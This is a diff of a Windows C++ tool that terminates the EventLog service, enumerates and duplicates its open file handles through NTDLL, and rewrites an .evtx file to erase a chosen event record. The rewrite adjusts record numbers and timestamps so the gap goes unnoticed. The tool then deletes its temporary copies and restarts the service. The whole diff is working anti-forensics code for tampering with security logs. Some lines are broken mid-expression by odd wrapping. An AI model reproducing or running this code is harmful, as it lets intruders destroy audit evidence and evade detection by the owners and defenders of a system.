@@ -1,7 +1,16 @@
 #include <windows.h>
+#include <process.h>
 #pragma comment(lib,"Advapi32.lib") 
 #define SUCCESSED 0
 #define FAILURE 1
+
+#define NT_SUCCESS(x) ((x) >= 0)
+#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
+
+#define SystemHandleInformation 16
+#define ObjectBasicInformation 0
+#define ObjectNameInformation 1
+#define ObjectTypeInformation 2
 
 #pragma pack(1)
 typedef struct _ELFFILE_HEADER
@@ -46,6 +55,134 @@ typedef struct _EVENT_RECORD
 #pragma pack()
 
 unsigned int CRC32[256];
+
+typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
+	ULONG SystemInformationClass,
+	PVOID SystemInformation,
+	ULONG SystemInformationLength,
+	PULONG ReturnLength
+	);
+typedef NTSTATUS(NTAPI *_NtDuplicateObject)(
+	HANDLE SourceProcessHandle,
+	HANDLE SourceHandle,
+	HANDLE TargetProcessHandle,
+	PHANDLE TargetHandle,
+	ACCESS_MASK DesiredAccess,
+	ULONG Attributes,
+	ULONG Options
+	);
+typedef NTSTATUS(NTAPI *_NtQueryObject)(
+	HANDLE ObjectHandle,
+	ULONG ObjectInformationClass,
+	PVOID ObjectInformation,
+	ULONG ObjectInformationLength,
+	PULONG ReturnLength
+	);
+
+typedef struct _UNICODE_STRING
+{
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _SYSTEM_HANDLE
+{
+	ULONG ProcessId;
+	BYTE ObjectTypeNumber;
+	BYTE Flags;
+	USHORT Handle;
+	PVOID Object;
+	ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION
+{
+	ULONG HandleCount;
+	SYSTEM_HANDLE Handles[1];
+} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
+
+typedef enum _POOL_TYPE
+{
+	NonPagedPool,
+	PagedPool,
+	NonPagedPoolMustSucceed,
+	DontUseThisType,
+	NonPagedPoolCacheAligned,
+	PagedPoolCacheAligned,
+	NonPagedPoolCacheAlignedMustS
+} POOL_TYPE, *PPOOL_TYPE;
+
+typedef struct _OBJECT_TYPE_INFORMATION
+{
+	UNICODE_STRING Name;
+	ULONG TotalNumberOfObjects;
+	ULONG TotalNumberOfHandles;
+	ULONG TotalPagedPoolUsage;
+	ULONG TotalNonPagedPoolUsage;
+	ULONG TotalNamePoolUsage;
+	ULONG TotalHandleTableUsage;
+	ULONG HighWaterNumberOfObjects;
+	ULONG HighWaterNumberOfHandles;
+	ULONG HighWaterPagedPoolUsage;
+	ULONG HighWaterNonPagedPoolUsage;
+	ULONG HighWaterNamePoolUsage;
+	ULONG HighWaterHandleTableUsage;
+	ULONG InvalidAttributes;
+	GENERIC_MAPPING GenericMapping;
+	ULONG ValidAccess;
+	BOOLEAN SecurityRequired;
+	BOOLEAN MaintainHandleCount;
+	USHORT MaintainTypeList;
+	POOL_TYPE PoolType;
+	ULONG PagedPoolUsage;
+	ULONG NonPagedPoolUsage;
+} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;
+
+PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
+{
+	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
+}
+
+BOOL EnableDebugPrivilege(BOOL fEnable)
+{
+	BOOL fOk = FALSE;
+	HANDLE hToken;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
+	{
+		TOKEN_PRIVILEGES tp;
+		tp.PrivilegeCount = 1;
+		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
+		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+		fOk = (GetLastError() == ERROR_SUCCESS);
+		CloseHandle(hToken);
+	}
+	return(fOk);
+}
+
+void CheckBlockThreadFunc(void* param)
+{
+	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
+	if (NtQueryObject != NULL)
+	{
+		PVOID objectNameInfo = NULL;
+		ULONG returnLength;
+		objectNameInfo = malloc(0x1000);
+		NtQueryObject((HANDLE)param, ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
+	}
+}
+
+BOOL IsBlockingHandle(HANDLE handle)
+{
+	HANDLE hThread = (HANDLE)_beginthread(CheckBlockThreadFunc, 0, (void*)handle);
+	if (WaitForSingleObject(hThread, 100) != WAIT_TIMEOUT) {
+		return FALSE;
+	}
+	TerminateThread(hThread, 0);
+	return TRUE;
+}
+
 
 static void init_table()
 {
@@ -260,7 +397,9 @@ ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 						{
 							if (deleted)
 							{
-								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, eventRecordIdentifier - 1);
+								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, 
+
+eventRecordIdentifier - 1);
 							}
 						}
 						else
@@ -283,21 +422,29 @@ ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 							{
 								ULONG TempprevRecordPtrSize = prevRecordPtr->Size;
 								prevRecordPtr->Size += currentRecordPtr->Size;
-								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr->Size;
+								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr-
+
+>Size;
 								memset(currentRecordPtr, 0, currentRecordPtr->Size - 4);
 								deleted = TRUE;
 								result = SUCCESSED;
 								currentRecordPtr = prevRecordPtr;
 								if (currentChunk->LastEventRecordIdentifier == recordNumber)
 								{
-									currentChunk->LastEventRecordDataOffset = currentChunk->LastEventRecordDataOffset - TempprevRecordPtrSize;
+									currentChunk->LastEventRecordDataOffset = currentChunk-
+
+>LastEventRecordDataOffset - TempprevRecordPtrSize;
 								}
 							}
 							else
 							{
 								PBYTE xmlDataPtr = (PBYTE)currentRecordPtr + 24;
-								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)currentRecordPtr);
-								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)nextRecordPtr);
+								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr
+
+((PBYTE)currentRecordPtr);
+								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)
+
+nextRecordPtr);
 								*(PULONG)xmlDataPtr = 0x1010f;
 								*(PWORD)(xmlDataPtr + 4) = 0x10c;
 								if (currentRecordTemplateInstancePtr)
@@ -305,36 +452,66 @@ ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 									if (nextRecordPtr)
 									{
 										ULONG a3 = 0;
-										PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
+										PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr
+
+((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
 										if (templateIdentifierPtr)
 										{
-											PBYTE templateDefinition = (PBYTE)GetTemplateDefinition((PBYTE)currentChunk, currentRecordPtr, currentRecordTemplateInstancePtr);
-											*(PULONG)(templateDefinition + 16) = templateIdentifierPtr - templateDefinition - 24;
+											PBYTE templateDefinition = (PBYTE)
+
+GetTemplateDefinition((PBYTE)currentChunk, currentRecordPtr, currentRecordTemplateInstancePtr);
+											*(PULONG)(templateDefinition + 16) = 
+
+templateIdentifierPtr - templateDefinition - 24;
 											currentRecordPtr->Size += nextRecordPtr->Size;
-											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
-											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
-											*(PULONG)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
-											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
-											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
+											*(PULONG)(currentRecordPtr->Size + (PBYTE)
+
+currentRecordPtr - 4) = currentRecordPtr->Size;
+											currentRecordPtr->WrittenDateAndTime = nextRecordPtr-
+
+>WrittenDateAndTime;
+											*(PULONG)(currentRecordTemplateInstancePtr + 10) = *
+
+(PULONG)(nextRecordTemplateInstancePtr + 10);
+											ModifyRecordNumber((PBYTE)currentChunk, 
+
+currentRecordPtr, recordNumber);
+											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, 
+
+recordNumber);
 											deleted = TRUE;
 											result = SUCCESSED;
 										}
 										else
 										{
-											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
-											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
-											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
-											*(PULONG64)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
+											ModifyRecordNumber((PBYTE)currentChunk, 
+
+currentRecordPtr, recordNumber);
+											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, 
+
+recordNumber);
+											currentRecordPtr->WrittenDateAndTime = nextRecordPtr-
+
+>WrittenDateAndTime;
+											*(PULONG64)(currentRecordTemplateInstancePtr + 10) = 
+
+*(PULONG)(nextRecordTemplateInstancePtr + 10);
 											*xmlDataPtr = 11;
 											*(PWORD)(xmlDataPtr + 1) = 0;
 											*(xmlDataPtr + 3) = 11;
-											*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
+											*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)
+
+nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
 											currentRecordPtr->Size += nextRecordPtr->Size;
-											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
+											*(PULONG)(currentRecordPtr->Size + (PBYTE)
+
+currentRecordPtr - 4) = currentRecordPtr->Size;
 											deleted = TRUE;
 											result = SUCCESSED;
 										}
-										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + currentRecordPtr->Size);
+										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + 
+
+currentRecordPtr->Size);
 									}
 								}
 							}
@@ -395,7 +572,9 @@ ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 						tmp -= numberOfChunk;
 					nextChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
 				}
-				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber && 0xffffffffffffffff == currentChunkPtr->LastEventRecordIdentifier)
+				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber && 0xffffffffffffffff == currentChunkPtr-
+
+>LastEventRecordIdentifier)
 				{
 					if (nextChunkPtr)
 					{
@@ -431,24 +610,7 @@ ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 	return result;
 }
 
-BOOL EnableDebugPrivilege(BOOL fEnable)
-{
-	BOOL fOk = FALSE;
-	HANDLE hToken;
-	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
-	{
-		TOKEN_PRIVILEGES tp;
-		tp.PrivilegeCount = 1;
-		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
-		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
-		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
-		fOk = (GetLastError() == ERROR_SUCCESS);
-		CloseHandle(hToken);
-	}
-	return(fOk);
-}
-
-DWORD  getpid()
+DWORD  getpid2()
 {
 	DWORD PID = 0;
 	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
@@ -467,7 +629,9 @@ DWORD  getpid()
 		DWORD servicesReturned;
 		LPDWORD lpResumeHandle = NULL;
 		LPCSTR pszGroupName = NULL;
-		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
+		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, 
+
+&servicesReturned, lpResumeHandle, pszGroupName);
 		cbBufSize = pcbBytesNeeded;
 		lpServices = new BYTE[cbBufSize];
 		if (NULL == lpServices)
@@ -476,14 +640,15 @@ DWORD  getpid()
 		}
 		else
 		{
-			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
+			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, 
+
+&servicesReturned, lpResumeHandle, pszGroupName);
 			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
 			for (DWORD i = 0; i < servicesReturned; i++)
 			{
 				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
 				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
 				{
-					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
 					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
 					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
 				}
@@ -529,30 +694,152 @@ int DeleteEventlog(char *Path1, char *Path2, DWORD EventLogRecordID)
 	return 0;
 }
 
+BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
+{
+	NTSTATUS status;
+	PSYSTEM_HANDLE_INFORMATION handleInfo;
+	ULONG handleInfoSize = 0x10000;
+	HANDLE processHandle = NULL;
+	ULONG i;
+	DWORD ErrorPID = 0;
+	SYSTEM_HANDLE handle = { 0 };
+
+	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), 
+
+"NtQuerySystemInformation");
+	if (!NtQuerySystemInformation)
+	{
+		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
+		return 0;
+	}
+	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
+	if (!NtDuplicateObject)
+	{
+		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
+		return 0;
+	}
+	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
+	if (!NtQueryObject)
+	{
+		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
+		return 0;
+	}
+
+	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
+	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
+		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
+	if (!NT_SUCCESS(status))
+	{
+		printf("[!]NtQuerySystemInformation failed!\n");
+		return 0;
+	}
+
+	UNICODE_STRING objectName;
+	ULONG returnLength;
+	for (i = 0; i < handleInfo->HandleCount; i++)
+	{
+		handle = handleInfo->Handles[i];
+		HANDLE dupHandle = NULL;
+		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
+		PVOID objectNameInfo = NULL;
+
+		if (handle.ProcessId != pid)
+		{
+			free(objectTypeInfo);
+			free(objectNameInfo);
+			CloseHandle(dupHandle);
+			continue;
+		}
+
+		if (handle.ProcessId == ErrorPID)
+		{
+			free(objectTypeInfo);
+			free(objectNameInfo);
+			CloseHandle(dupHandle);
+			continue;
+		}
+
+		if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId)))
+		{
+			printf("[!]Could not open PID %d!\n", handle.ProcessId);
+			ErrorPID = handle.ProcessId;
+			free(objectTypeInfo);
+			free(objectNameInfo);
+			CloseHandle(dupHandle);
+			CloseHandle(processHandle);
+			continue;
+		}
+
+		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, 0)))
+		{
+			//			printf("[%#x] Error!\n", handle.Handle);
+			free(objectTypeInfo);
+			free(objectNameInfo);
+			CloseHandle(dupHandle);
+			CloseHandle(processHandle);
+			continue;
+		}
+		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
+		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
+		{
+			//			printf("[%#x] Error!\n", handle.Handle);
+			free(objectTypeInfo);
+			free(objectNameInfo);
+			CloseHandle(dupHandle);
+			CloseHandle(processHandle);
+			continue;
+		}
+		objectNameInfo = malloc(0x1000);
+
+		if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
+		{
+			free(objectTypeInfo);
+			free(objectNameInfo);
+			CloseHandle(dupHandle);
+			CloseHandle(processHandle);
+			continue;
+		}
+		CloseHandle(dupHandle);
+	}
+	free(handleInfo);
+
+	return TRUE;
+}
+
+
 int main(int argc, char* argv[])
 {
 	if (argc != 3)
 	{
-		printf("Kill the eventlog service's process and delete one eventlog record,then restart the Eventlog Service.\n\n");
+		printf("Kill the eventlog service's process and delete one eventlog record,then restart the Eventlog Service.\n");
+		printf("Delete the eventlog by rewriting the evtx file.\n\n");
 		printf("Usage:\n");
-		printf("%s <Eventlog full path> <EventlogRecordID>\n",argv[0]);
+		printf("%s <Eventlog file name> <EventlogRecordID>\n", argv[0]);
 		printf("eg:\n");
 		printf("     %s system.evtx 1910\n", argv[0]);
 		return 0;
 	}
-	printf("[+]Eventlog full path:%s\n", argv[1]);
-	printf("[+]EventRecordID:%s\n", argv[2]);
+	
 	DWORD EventRecordID = 0;
 	sscanf_s(argv[2], "%d", &EventRecordID);
 
-	DWORD pid = getpid();
+	DWORD pid = getpid2();
 	if (pid == 0)
 	{
 		printf("[!]Get EventLog's PID error\n");
 		return -1;
 	}
 
-	printf("[+]Try to EnableDebugPrivilege... ");
+	char * lpPath = new char[MAX_PATH];
+	ZeroMemory(lpPath, MAX_PATH);
+	GetSystemDirectory(lpPath, MAX_PATH);
+	strcat_s(lpPath, MAX_PATH, "\\winevt\\logs\\");
+	strcat_s(lpPath, MAX_PATH, argv[1]);
+	printf("[+]Path:%s\n", lpPath);
+
+	printf("[+]Delete the eventlog by rewriting the evtx file \n");
+
+	printf("1.Try to EnableDebugPrivilege... ");
 	if (!EnableDebugPrivilege(TRUE))
 	{
 		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
@@ -560,7 +847,7 @@ int main(int argc, char* argv[])
 	}
 	printf("Done\n");
 
-	printf("[+]Try to OpenProcess... ");
+	printf("2.Try to OpenProcess... ");
 	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
 	if (processHandle == NULL)
 	{
@@ -569,7 +856,7 @@ int main(int argc, char* argv[])
 	}
 	printf("Done\n");
 
-	printf("[+]Try to TerminateProcess... ");
+	printf("3.Try to TerminateProcess... ");
 	BOOL bResult = TerminateProcess(processHandle, 0);
 	if (bResult == NULL)
 	{
@@ -577,28 +864,51 @@ int main(int argc, char* argv[])
 		return -1;
 	}
 	printf("Done\n");
-	printf("[+]Try to Copy evtx file to current path... ");
+	
+	printf("4.Try to CloseFileHandle... ");
 
-	if ((CopyFile(argv[1], "Temp1.evtx", FALSE)) == NULL)
+	wchar_t Buf1[100];
+	swprintf(Buf1, 100, L"%hs", argv[1]);
+	_wcslwr_s(Buf1, wcslen(Buf1) + 1);
+
+	bResult = CloseFileHandle(Buf1, pid);
+	if (bResult == NULL)
+	{
+		printf("error\n");
+		return -1;
+	}
+	printf("Done\n");
+	
+	printf("5.Try to Copy evtx file to current path... ");
+
+	if ((CopyFile(lpPath, "Temp1.evtx", FALSE)) == NULL)
 		printf("Error,%d\n", GetLastError());
 	else
 	{
 		printf("Done\n");
-		printf("[+]Try to Delete the eventlog... ");
-
+		printf("6.Try to Delete the eventlog... ");
 		if (DeleteEventlog("Temp1.evtx", "Temp2.evtx", EventRecordID) != -1)
 		{
 			printf("Done\n");
 
-			printf("[+]Try to replace evtx file... ");
-			if ((CopyFile("Temp2.evtx", argv[1], FALSE)) == NULL)
+			printf("7.Try to replace evtx file... ");
+			if ((CopyFile("Temp2.evtx", lpPath, FALSE)) == NULL)
 				printf("Error,%d\n", GetLastError());
 			else
 				printf("Done\n");
 		}
 	}
 
-	printf("[+]Try to Restart eventlog service...\n");
+	printf("8.Try to delete temp.evtx... ");
+	if ((DeleteFile("Temp1.evtx")) == NULL)
+		printf("\n[!]Error,%d\n", GetLastError());
+	else
+	{
+		DeleteFile("Temp2.evtx");
+		printf("Done\n");
+	}
+		
+	printf("9.Try to Restart eventlog service...\n");
 	system("net start eventlog");
 	printf("[+]All Done\n");
 	return 0;
